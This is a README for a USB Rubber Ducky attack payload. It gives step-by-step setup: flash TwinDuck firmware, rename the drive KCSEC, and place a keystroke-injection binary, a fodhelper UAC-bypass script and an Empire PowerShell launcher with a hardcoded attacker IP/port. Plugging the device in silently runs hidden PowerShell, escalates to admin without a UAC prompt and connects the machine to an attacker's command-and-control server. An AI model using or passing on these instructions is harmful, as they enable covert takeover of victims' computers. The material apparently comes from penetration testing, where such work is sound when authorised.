Fodhelper bypass to Empire Launcher

** Key info **

* Twin Duck Special 2 required (See Ducky Flasher OR Firmware list)
* This version has a delay added to allow the USB Storage to mount
* Drive must be called KCSEC to work (Can be changed in ducky code)
* Empire-launcher.ps1 Must be changed to have the right IP/Port
* Ducky_code.txt shows inject.bin decoded (Not needed for setup)


** Explaination **

Ducky commands runs a hidden powershell calling the fod.ps1
This bypasses UAC and runs the Empire Launcher with admin rights without a UAC prompt

More info on fodhelper UAC bypass here https://pentestlab.blog/tag/fodhelper/

** Files ** 

* Inject.bin = HID attack to launch fod.ps1 (Soft-coded drive name KCSEC)
* fod.ps1 = Fodhelper UAC Bypass (Inc Softcoded payload name "Empire-launcher.ps1")
* Empire-launcher.ps1 = Empire http Launcher (Hardcoded IP/Port)


** How to use **

1. Flash rubber ducky TwinDuck Special 2 
   c_duck_v2_S002.hex (Can use Ducky-flasher)

2. rename Rubber Ducky SDCARD to "KCSEC" (inject.bin requires this to launch fod.ps1)

3. Create new payload with Empire 
   - Create http listener 
   - launcher powershell (powershell -noP -sta -w 1 -enc  SQBmACgA....)
   - Add new powershell launch code to Empire-launcher.ps1
   

4. Add new Empire-launcher.ps1 to root of KCSEC Ducky Drive

5. Add fod.ps1 to root of KCSEC ducky Drive

6. Add Inject.bin to root of KCSEC Ducky Drive


Once the above is done either reset or unplug/replug your new KCSEC Rubber Ducky to use 
Then press button to re-execute activate


(You must have inject.bin + fod.ps1 + Empire-launcher.ps1 on the root of the KCSEC Rubber ducky drive)